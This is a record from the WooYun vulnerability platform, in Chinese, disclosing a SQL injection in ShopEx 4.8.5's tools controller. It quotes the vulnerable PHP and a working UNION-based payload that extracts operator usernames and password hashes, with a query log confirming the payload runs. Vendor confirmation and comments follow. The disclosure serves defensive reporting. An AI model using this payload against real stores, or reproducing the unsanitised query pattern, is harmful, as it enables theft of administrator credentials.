{"id": 10369, "wybug_id": "wooyun-2013-024553", "wybug_title": "shopex注入漏洞#1", "wybug_corp": "ShopEx", "wybug_author": "Code_Sec", "wybug_date": "2013-05-26 20:32", "wybug_open_date": "2013-08-24 20:33", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-24：\t细节向公众公开  简要描述： 又是sql注入测试版本：shopex-singel-4.8.5.78660 详细说明：  文件\\core\\shop\\controller\\ctl.tools.php\nfunction products(){        $objGoods  = &$this->system->loadModel('goods/products');        $filter = array();        foreach(explode(',',$_POST['goods']) as $gid){            $filter['goods_id'][] = $gid;         }        $this->pagedata['products'] = $objGoods->getList($objGoods->defaultCols.',find_in_set(goods_id,\"'.$_POST['goods'].'\") as rank',$filter,0,-1,array('rank','asc'));\n目测$_POST['goods']直接进入到sql语句中，由于部分文件加密开启sql语句执行记录日志提交：goods=aaa\") FROM sdb_goods union select 1,concat(username,userpass),3,4,5,6,7,8,9,10,11,12,13 from sdb_operators%23\n130526 20:03:23\t  352 Connect\troot@localhost on \t\t  352 Init DB\tshopex\t\t  352 Query\tSET NAMES 'utf8'\t\t  352 Query\tSELECT * FROM sdb_plugins WHERE plugin_type=\"app\"\t\t  352 Query\tselect * from sdb_plugins where plugin_type=\"app\" and plugin_ident='commodity_radar' LIMIT 0, 1\t\t  352 Query\tselect * from sdb_plugins where plugin_type=\"app\" and plugin_ident='shopex_stat' LIMIT 0, 1\t\t  352 Query\tSELECT count(goods_id) FROM sdb_goods WHERE goods_id IN (0,0,0,3,4,5,6,7,8,9,10,11,12,13) AND sdb_goods.disabled = 'false' AND sdb_goods.goods_type='normal' ORDER BY rank asc\t\t  352 Query\tSELECT bn,name,cat_id,price,store,marketable,brand_id,weight,d_order,uptime,type_id,supplier_id,find_in_set(goods_id,\"aaa\") FROM sdb_goods union select 1,concat(username,userpass),3,4,5,6,7,8,9,10,11,12,13 from sdb_operators#\") as rank,goods_id,image_default,thumbnail_pic,brief,pdt_desc,mktprice,big_pic FROM sdb_goods WHERE goods_id IN (0,0,0,3,4,5,6,7,8,9,10,11,12,13) AND sdb_goods.disabled = 'false' AND sdb_goods.goods_type='normal' ORDER BY rank asc LIMIT 0, 18446744073709551615\n查看日志变量已经进入到sql语句中   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 Code_Sec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-05-26 23:16 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-26 20:35 |    \t\t墨迹哥 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 蛋疼是我的专利,你如果比我更蛋腾，我就切...)\t\t \n  表示关注，亲，你太强大了。    \n     2013-05-26 21:05 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  拿奖    \n     2013-05-27 07:58 |    \t\tetcat \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:22        | 0101010101001010101010101010100101010101...)\t\t \n  亲 这个不错  好喜欢啊    \n     2013-05-27 17:21 |    \t\t小痞子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:21        | <xss>alert(\"a\")</xss>￥&@&……dssKhwjcw...)\t\t \n  亲 可以免费试用么？    \n     2013-08-24 21:59 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  我手里表示也有一个- -    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}